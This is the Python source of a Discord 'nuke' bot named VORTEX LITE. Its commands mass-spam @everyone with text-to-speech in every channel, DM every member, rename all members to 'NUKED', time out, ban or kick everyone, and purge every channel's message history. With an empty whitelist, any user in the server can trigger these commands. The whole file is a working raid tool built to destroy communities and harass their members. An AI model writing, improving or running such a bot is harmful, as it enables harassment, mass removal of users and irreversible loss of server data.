import os
import discord
from discord.ext import commands
import asyncio
import aiohttp
from datetime import datetime, timedelta
import random

class Config:
    TOKEN = os.environ.get("DISCORD_TOKEN", "")
    PREFIX = "/"
    WHITELIST = []
    SPAM_MESSAGE = "@everyone NUKED BY VORTEX"
    SPAM_COUNT = 50
    TEXT_TO_SPEECH = True
    DM_MESSAGE = "YOUR SERVER GOT NUKED"
    TIMEOUT_DURATION = 28
    NICKNAME = "NUKED"

config = Config()
bot = commands.Bot(command_prefix=config.PREFIX, intents=discord.Intents.all())
bot.remove_command("help")

def is_whitelisted(ctx):
    return True if not config.WHITELIST else ctx.author.id in config.WHITELIST

@bot.event
async def on_ready():
    print(f"VORTEX ONLINE | {bot.user}")

@bot.check
async def globally_check_dm(ctx):
    return ctx.guild is not None

@bot.command()
async def spam(ctx, count: int = config.SPAM_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 200))
    for _ in range(count):
        try:
            await ctx.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH)
        except:
            pass
        await asyncio.sleep(0.01)

@bot.command()
async def mspam(ctx, count: int = config.SPAM_COUNT):
    if not is_whitelisted(ctx): return
    count = max(1, min(count, 50))
    for channel in ctx.guild.text_channels:
        for _ in range(count):
            try:
                await channel.send(config.SPAM_MESSAGE, tts=config.TEXT_TO_SPEECH)
            except:
                pass
            await asyncio.sleep(0.01)

@bot.command()
async def dmall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member != bot.user:
            try:
                await member.send(config.DM_MESSAGE)
            except:
                pass
            await asyncio.sleep(0.01)

@bot.command()
async def rnickall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        try:
            await member.edit(nick=config.NICKNAME)
        except:
            pass
        await asyncio.sleep(0.01)

@bot.command()
async def timeoutall(ctx):
    if not is_whitelisted(ctx): return
    duration = min(config.TIMEOUT_DURATION, 28)
    for member in ctx.guild.members:
        if member != bot.user:
            try:
                await member.timeout(timedelta(days=duration))
            except:
                pass
            await asyncio.sleep(0.01)

@bot.command()
async def untimeoutall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        try:
            await member.timeout(None)
        except:
            pass
        await asyncio.sleep(0.01)

@bot.command()
async def banall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.ban()
            except:
                pass
            await asyncio.sleep(0.01)

@bot.command()
async def kickall(ctx):
    if not is_whitelisted(ctx): return
    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.kick()
            except:
                pass
            await asyncio.sleep(0.01)

@bot.command()
async def purge(ctx):
    if not is_whitelisted(ctx): return
    try:
        await ctx.channel.purge(limit=None)
    except:
        pass

@bot.command()
async def mpurge(ctx):
    if not is_whitelisted(ctx): return
    for channel in ctx.guild.text_channels:
        try:
            await channel.purge(limit=None)
        except:
            pass
        await asyncio.sleep(1)

@bot.command()
async def kill(ctx):
    if not is_whitelisted(ctx): return
    await bot.close()

@bot.command(name='help')
async def help(ctx):
    embed = discord.Embed(title="VORTEX LITE", description="No delete/create. Spam, DMs, nick, timeout, ban/kick, purge.", color=discord.Color.red())
    embed.add_field(name="Commands", value="`spam` `mspam` `dmall` `rnickall` `timeoutall` `untimeoutall` `banall` `kickall` `purge` `mpurge` `kill`", inline=False)
    await ctx.send(embed=embed)

bot.run(config.TOKEN)